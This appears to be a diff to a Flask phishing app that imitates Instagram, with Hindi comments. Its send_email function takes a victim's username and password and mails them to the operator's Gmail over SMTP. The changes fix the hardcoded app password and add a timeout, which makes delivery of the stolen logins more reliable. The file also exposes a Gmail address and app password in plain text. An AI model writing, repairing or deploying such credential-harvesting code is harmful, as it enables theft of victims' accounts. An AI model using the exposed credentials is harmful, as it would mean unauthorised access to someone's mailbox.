@@ -5,10 +5,10 @@ from flask import Flask, request
 
 app = Flask(__name__)
 
-# ===== आपकी ईमेल जानकारी (Set & Ready) =====
+# ===== आपकी ईमेल जानकारी (Spaces हटा दी गई हैं) =====
 YOUR_GMAIL = "mogamadhari@gmail.com"
-APP_PASSWORD = "fbhb qgqo fhsh ejfi"
-# ==========================================
+APP_PASSWORD = "fbhbqgqofhshejfi"
+# ==================================================
 
 INSTA_STYLE = '''
 <style>
@@ -43,11 +43,12 @@ def send_email(username, password, count):
         """
         msg.attach(MIMEText(body, 'plain'))
 
-        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
         server.starttls()
         server.login(YOUR_GMAIL, APP_PASSWORD)
         server.send_message(msg)
         server.quit()
+        print("Email sent successfully!")
     except Exception as e:
         print(f"Error sending email: {e}")
 
